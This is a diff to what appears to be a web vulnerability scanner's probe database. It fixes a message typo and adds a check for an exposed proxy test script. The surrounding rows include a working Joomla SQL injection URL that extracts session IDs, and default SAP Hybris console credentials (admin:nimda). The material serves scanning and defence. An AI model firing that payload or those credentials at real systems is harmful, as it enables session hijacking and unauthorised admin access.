@@ -6995,6 +6995,7 @@
 "007049","0","123b","@MAGMIReleaseNotes.txt","GET","RELEASE NOTES FOR MAGMI","","","","","MAGMI Release Notes identified.","",""
 "007050","0","be","@HYBRIS","GET","[H|h]ybris","","[M|m]anagement\s[C|c]onsole","","","SAP Hybris Management Console found. Default credentials are admin:nimda","",""
 "007051","0","be","@HYBRISlogin.jsp","GET","[H|h]ybris","","[A|a]dministration\s[C|c]onsole","","","SAP Hybris Administration Console found. Default credentials are admin:nimda","",""
-"007052","0","23","/cfg/CFGConnectionParams.txt","GET","user=","","","","","Caremark Carestream config file found. May include account information and host data..","",""
+"007052","0","23","/cfg/CFGConnectionParams.txt","GET","user=","","","","","Caremark Carestream config file found. May include account information and host data.","",""
 "007053","0","23","/serverVars.js","GET","SERVER_IPADDRESS","","","","","Caremark Carestream JavaScript config file found. May include host information..","",""
 "007054","0","9","/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=(select%201%20FROM(select%20count(*),concat((select%20(select%20concat(session_id))%20FROM%20jml_session%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)","GET","Duplicate\sEntry","Subquery","","","","Joomla is vulnerable to a SQL injection which can lead to administrator access. https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/?page=1&year=0&month=0","",""
+"007055","0","3b","/azenv.php","GET","HTTP_CONNECTION","","","","","This program is a proxy test script which echoes environment variables.","",""
